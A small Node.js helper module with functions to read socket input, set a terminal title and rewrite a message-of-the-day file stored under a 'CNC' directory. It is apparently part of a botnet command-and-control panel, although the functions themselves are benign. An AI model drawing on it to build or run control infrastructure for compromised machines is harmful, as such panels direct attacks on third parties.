// Modules
const fs = require("fs");

// Files
const Server = require("./main.js");

/*
*@params: Socket, Str
*@type: [<string>]
*/
exports.getInput = function(socket, string) {
    return new Promise(resolve => {
        socket.write(string);

        socket.on("data", c => {
        c = c.toString();
        
        if(c.indexOf("\n") !== -1) {
            socket.removeAllListeners("data");
  
          return resolve(c.trim());
        }
      });
    });
}

/*
*@params: Str, Socket
*@type: [<string>]
*/
exports.set_title = function(string, socket) {
    socket.write("\033]0;" + string + "\007")
}

/*
*@params: MOTD
*@type: [<string>]
*/
exports.changeMotd = function(new_motd) {
    fs.writeFileSync("./CNC/db/sys/motd.dat", new_motd);
    return "[+] New Message of the day updated!";
}